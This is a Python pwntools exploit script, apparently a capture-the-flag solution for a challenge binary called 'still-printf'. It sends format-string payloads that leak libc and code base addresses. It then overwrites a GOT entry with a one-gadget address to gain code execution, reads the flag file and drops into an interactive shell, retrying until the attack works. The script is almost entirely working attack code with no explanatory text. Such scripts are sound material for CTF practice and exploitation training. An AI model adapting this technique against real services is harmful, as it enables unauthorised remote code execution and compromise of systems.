from pwn import *
import sys

remote_ip,port = '0.0.0.0', 9509
binary = './still-printf'

context.terminal=['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = 'debug'

def get_length(a,b):
    while(hex(a)[-2:]!=b):
        a = a+1
    return a


def fstring_payload(addr,offset,waddr):
    addr=hex(addr).replace("0x","")
    if len(addr)<16:
        addr=addr.rjust(16,"0")
    var1=int(addr[-4:],16)
    s2=addr[-6:-4]
    var2=get_length(var1,s2)-var1
    payload = "%{}x%{}$hn%{}x%{}$hhn".format(var1,offset+3,var2,offset+4).ljust(24,"a")
    payload += p64(waddr) + p64(waddr+2)
    return payload

if __name__ == "__main__":
    while True:
        try:
            io = remote(remote_ip,port)
            re = lambda a: io.recv(a)
            ru = lambda a: io.recvuntil(a)
            rl = lambda  : io.recvline()
            s  = lambda a: io.send(a)
            sl = lambda a: io.sendline(a)
            sla= lambda a,b: io.sendlineafter(a,b)
            sa = lambda a,b: io.sendafter(a,b)
            payload =  '%p' + '%{}d'.format(8192+40-11-14-14) + '%c'*9 + '%p' + '%c'*2 + '%hn' + '%157d' + '%41$hhn'
            s(payload)
            #print(hex(len(payload)))
            ru("0x")
            leak = int("0x"+re(12),16)
            libc = leak-0x1bd8d0
            log.info("Libc : "+hex(libc))
            ru("0x")
            code = int("0x"+re(12),16)-0x1200
            log.info("Code base : "+hex(code))
            got = code + 0x33b8
            gadgets = [libc+0x4484f, libc+0x448a3,libc + 0x448af,libc + 0xc70ca,libc + 0xc70cd, libc + 0xc70d0 ,libc+ 0xe5456]
            payload2 = fstring_payload(gadgets[0], 6, got) #5,#6
            #sleep(0.2)
            while io.can_recv(1):
                io.recv()
            sl(payload2)
            ru("\x20")
            log.info("Called main!")
            sl("cat /flag_*.txt")
            print io.recv()
            io.interactive()
        except:
            log.info("Failed!")
            io.close()